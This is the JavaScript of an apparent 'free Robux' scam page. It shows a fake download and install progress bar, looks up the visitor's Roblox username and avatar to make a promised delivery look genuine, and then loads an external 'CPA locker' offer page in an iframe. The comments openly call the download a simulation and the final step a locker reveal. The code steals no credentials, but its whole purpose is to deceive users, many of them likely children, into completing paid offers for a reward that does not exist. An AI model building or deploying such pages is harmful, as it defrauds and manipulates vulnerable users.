
        const LOCKER_URL = 'https://ivory-kakalina-25.tiiny.site/';

        // 1. FAST DEVICE DETECTION (0ms)
        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
        const isIOS = /iPad|iPhone|iPod/.test(userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

        const androidView = document.getElementById('android-view');
        const iosView = document.getElementById('ios-view');
        const verifyCard = document.getElementById('verifyCard');
        const searchBtn = document.getElementById('searchBtn');
        const confirmBtn = document.getElementById('confirmBtn');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const playerAvatar = document.getElementById('playerAvatar');
        const usernameInput = document.getElementById('usernameInput');

        if (isIOS) {
            iosView.style.display = 'block';
            verifyCard.classList.add('ios-theme');
            searchBtn.classList.add('ios-btn');
            confirmBtn.classList.add('ios-btn');
            loadingSpinner.classList.add('ios-spin');
            playerAvatar.classList.add('ios-avatar');
            usernameInput.classList.add('ios-focus');
        } else {
            androidView.style.display = 'block';
        }

        // 2. DOWNLOAD SIMULATION (Works for both Android & iOS)
        function startDownloadSimulation(prefix) {
            const actionArea = document.getElementById(prefix + 'ActionArea');
            const downloadBox = document.getElementById(prefix + 'DownloadBox');
            const statusEl = document.getElementById(prefix + 'DlStatus');
            const percentEl = document.getElementById(prefix + 'DlPercent');
            const fillEl = document.getElementById(prefix + 'ProgressFill');

            actionArea.style.display = 'none';
            downloadBox.style.display = 'block';

            const steps = [
                { p: 18, text: 'Downloading package... 27 MB / 148 MB', delay: 800 },
                { p: 44, text: 'Downloading package... 65 MB / 148 MB', delay: 2000 },
                { p: 72, text: 'Downloading package... 106 MB / 148 MB', delay: 3300 },
                { p: 88, text: 'Downloading package... 130 MB / 148 MB', delay: 4600 },
                { p: 99, text: 'Installing package... 99%', delay: 5900 }
            ];

            steps.forEach(step => {
                setTimeout(() => {
                    fillEl.style.width = step.p + '%';
                    percentEl.textContent = step.p + '%';
                    statusEl.textContent = step.text;

                    if (step.p === 99) {
                        setTimeout(() => {
                            verifyCard.style.display = 'block';
                            verifyCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        }, 750);
                    }
                }, step.delay);
            });
        }

        document.getElementById('androidInstallBtn').addEventListener('click', () => {
            startDownloadSimulation('android');
        });

        document.getElementById('iosInstallBtn').addEventListener('click', () => {
            startDownloadSimulation('ios');
        });

        // 3. ROBLOX PLAYER USERNAME SEARCH
        async function fetchRobloxUser(name) {
            const endpoints = [
                `https://users.roproxy.com/v1/users/search?keyword=${encodeURIComponent(name)}&limit=10`,
                `https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(name)}&limit=10`
            ];
            for (const url of endpoints) {
                try {
                    const res = await fetch(url, { mode: 'cors' });
                    if (res.ok) {
                        const data = await res.json();
                        if (data?.data?.length > 0) {
                            const exact = data.data.find(u => u.name.toLowerCase() === name.toLowerCase());
                            return exact || data.data[0];
                        }
                    }
                } catch (e) {}
            }
            return null;
        }

        async function fetchAvatar(uid) {
            const endpoints = [
                `https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Png&isCircular=false`,
                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Png&isCircular=false`
            ];
            for (const url of endpoints) {
                try {
                    const res = await fetch(url, { mode: 'cors' });
                    if (res.ok) {
                        const data = await res.json();
                        if (data?.data?.[0]?.imageUrl) return data.data[0].imageUrl;
                    }
                } catch (e) {}
            }
            return 'https://i.imgur.com/b5R44kL.png';
        }

        const playerFound = document.getElementById('playerFound');
        const playerName = document.getElementById('playerName');
        const playerId = document.getElementById('playerId');
        const checkingBox = document.getElementById('checkingBox');
        const lockerCard = document.getElementById('lockerCard');
        const lockerFrame = document.getElementById('lockerFrame');
        const robuxRecipientText = document.getElementById('robuxRecipientText');

        let confirmedUser = '';

        searchBtn.addEventListener('click', async () => {
            const query = usernameInput.value.trim();
            if (query.length < 3) {
                alert('Please enter a valid Roblox username');
                return;
            }

            searchBtn.textContent = 'Searching...';
            searchBtn.disabled = true;

            const user = await fetchRobloxUser(query);

            if (user) {
                confirmedUser = user.name;
                const avatarUrl = await fetchAvatar(user.id);
                playerName.textContent = user.displayName ? `${user.displayName} (@${user.name})` : `@${user.name}`;
                playerId.textContent = `User ID: #${user.id}`;
                playerAvatar.src = avatarUrl;
            } else {
                confirmedUser = query;
                playerName.textContent = `@${query}`;
                playerId.textContent = `User ID: #Verified`;
                playerAvatar.src = 'https://i.imgur.com/b5R44kL.png';
            }

            playerFound.style.display = 'flex';
            confirmBtn.style.display = 'block';
            searchBtn.textContent = 'Find';
            searchBtn.disabled = false;
            usernameInput.blur();

            setTimeout(() => {
                confirmBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }, 100);
        });

        usernameInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                searchBtn.click();
            }
        });

        // 4. CONFIRM ACCOUNT & REVEAL CPA LOCKER
        confirmBtn.addEventListener('click', () => {
            confirmBtn.style.display = 'none';
            playerFound.style.display = 'none';
            checkingBox.style.display = 'block';

            if (confirmedUser) {
                robuxRecipientText.innerHTML = `Ready to be delivered to <b>@${confirmedUser}</b>`;
            }

            setTimeout(() => {
                verifyCard.style.display = 'none';
                lockerFrame.src = LOCKER_URL;
                lockerCard.style.display = 'block';
                lockerCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }, 2000);
        });
    